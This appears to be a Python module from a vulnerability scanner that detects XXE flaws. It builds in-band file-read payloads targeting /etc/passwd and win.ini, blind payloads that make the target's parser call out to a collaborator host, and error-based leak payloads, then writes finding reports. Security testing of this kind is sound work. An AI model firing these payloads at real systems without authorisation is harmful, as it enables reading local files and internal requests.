"""
XXE (XML External Entity) detection.

From Bug Bounty Bootcamp (Li, Ch 15). Three layers, matching the chapter:

  1. In-band file read: define an external entity pointing at a local file
     (file:///etc/passwd) and reference it in a reflected element. If the
     response echoes the file's content signature, XXE is confirmed in-band.

  2. Blind / OOB: when nothing is reflected, use a parameter entity that makes
     the parser fetch an attacker URL — here the native collaborator. The
     server-side callback is the proof (reuses collaborator.py, so blind XXE is
     self-confirming without Burp/interactsh).

  3. Error-based: point an entity at an invalid path so the parser leaks file
     content inside its error message.

The XML/DTD builders and the response analyzer are pure/deterministic and
unit-tested; tools._run_xxe does the transport and the OOB correlation.
"""
from __future__ import annotations

import re

# local files whose content is unmistakable when reflected
FILE_TARGETS = [
    ("file:///etc/passwd", re.compile(r"root:.*?:0:0:", re.M)),
    ("file:///etc/hostname", re.compile(r"^[a-zA-Z0-9][a-zA-Z0-9.\-]{1,}$", re.M)),
    ("file:///c:/windows/win.ini", re.compile(r"\[(?:fonts|extensions|mci extensions)\]", re.I)),
]

_XML_CT = re.compile(r"(?:application|text)/(?:[\w.+-]*\+)?xml", re.I)


def looks_like_xml(content_type: str, body: str) -> bool:
    if _XML_CT.search(content_type or ""):
        return True
    b = (body or "").lstrip()
    return b.startswith("<?xml") or (b.startswith("<") and ">" in b)


def _inject_doctype(xml_body: str, doctype: str, entity_ref: str = "&xxe;") -> str:
    """Insert a DOCTYPE after the XML declaration and drop the entity reference
    into the first element's text (replacing its content)."""
    body = xml_body
    decl = ""
    m = re.match(r"^\s*<\?xml[^>]*\?>\s*", body)
    if m:
        decl, body = m.group(0), body[m.end():]
    # strip any existing DOCTYPE
    body = re.sub(r"<!DOCTYPE[^>]*(?:\[[^\]]*\])?>", "", body, count=1)
    # replace the text of the first leaf element with the entity reference
    new_body, n = re.subn(r"(<([A-Za-z_][\w.\-]*)(?:\s[^>]*)?>)[^<]*(</\2>)",
                          r"\1" + entity_ref + r"\3", body, count=1)
    if n == 0:
        new_body = body + f"<xxe>{entity_ref}</xxe>"
    return f"{decl}{doctype}\n{new_body}"


def build_inband_xml(file_uri: str, sample_xml: str = "") -> str:
    doctype = f'<!DOCTYPE root [<!ENTITY xxe SYSTEM "{file_uri}">]>'
    base = sample_xml or '<?xml version="1.0"?>\n<root><data>x</data></root>'
    return _inject_doctype(base, doctype)


def build_oob_xml(collab_url: str, sample_xml: str = "") -> str:
    # parameter entity in the internal subset triggers the fetch during parsing,
    # so it fires even when nothing is reflected (blind)
    doctype = (f'<!DOCTYPE root [<!ENTITY % rem SYSTEM "{collab_url}"> %rem;]>')
    base = sample_xml or '<?xml version="1.0"?>\n<root><data>x</data></root>'
    # keep the sample content; the callback happens at parse time
    body = re.sub(r"<!DOCTYPE[^>]*(?:\[[^\]]*\])?>", "", base, count=1)
    m = re.match(r"^\s*<\?xml[^>]*\?>\s*", body)
    decl = m.group(0) if m else ""
    rest = body[m.end():] if m else body
    return f"{decl}{doctype}\n{rest}"


def build_error_xml(file_uri: str, collab_host: str = "invalid.invalid") -> str:
    doctype = (f'<!DOCTYPE root [<!ENTITY % file SYSTEM "{file_uri}">'
               f'<!ENTITY % eval "<!ENTITY &#x25; err SYSTEM \'file:///nonexistent/%file;\'>">'
               f'%eval; %err;]>')
    return f'<?xml version="1.0"?>\n{doctype}\n<root>x</root>'


def analyze_inband(body: str) -> dict | None:
    """Return the matched file signature if a local file leaked into the body."""
    b = body or ""
    for uri, rx in FILE_TARGETS:
        m = rx.search(b)
        # /etc/hostname's loose pattern needs a real hit, not random tokens
        if m and (uri != "file:///etc/hostname" or "\n" in b[:200]):
            if uri == "file:///etc/passwd" or uri.endswith("win.ini"):
                return {"file": uri, "match": m.group(0)[:60]}
    return None


# ── finding builders ─────────────────────────────────────────────
def inband_finding(url: str, file_uri: str, match: str) -> dict:
    return {
        "title": "XXE confirmed (in-band local file read)", "severity": "critical", "target": url,
        "description": (f"An external XML entity pointing at {file_uri} was resolved and its content was reflected in "
                        f"the response (matched '{match}'). The XML parser processes external entities from untrusted "
                        "input."),
        "impact": ("Read arbitrary local files (config, secrets, source), reach internal services via SSRF, and on "
                   "some parsers escalate to RCE."),
        "reproduction_steps": [f"POST an XML body declaring an external entity SYSTEM \"{file_uri}\"",
                               "Reference the entity in a reflected element",
                               f"Observe the file content in the response ('{match}')"],
        "evidence": f"{file_uri} -> {match}", "cwe": "CWE-611", "family": "xxe",
        "tags": ["xxe", "file-read"], "confidence": "confirmed",
    }


def oob_finding(url: str, probe: str, interactions: list) -> dict:
    first = interactions[0] if interactions else {}
    src = first.get("source_ip", "?")
    return {
        "title": "Blind XXE confirmed via OOB interaction", "severity": "high", "target": url,
        "description": (f"An XML parameter entity pointing at the collaborator ({probe}) triggered a server-side "
                        f"request during parsing (interaction from {src}). Nothing was reflected, so this is a "
                        "confirmed blind XXE proven by the out-of-band callback."),
        "impact": "Blind file exfiltration (via an external DTD) and internal SSRF from the XML parser.",
        "reproduction_steps": [f"POST an XML body with a parameter entity SYSTEM \"{probe}\"",
                               f"Observe the inbound interaction at the collaborator from {src}",
                               "Escalate with an external DTD that exfiltrates file contents out-of-band"],
        "evidence": f"OOB interaction from {src} on {probe}", "cwe": "CWE-611", "family": "xxe",
        "tags": ["xxe", "blind", "oob"], "confidence": "confirmed",
    }
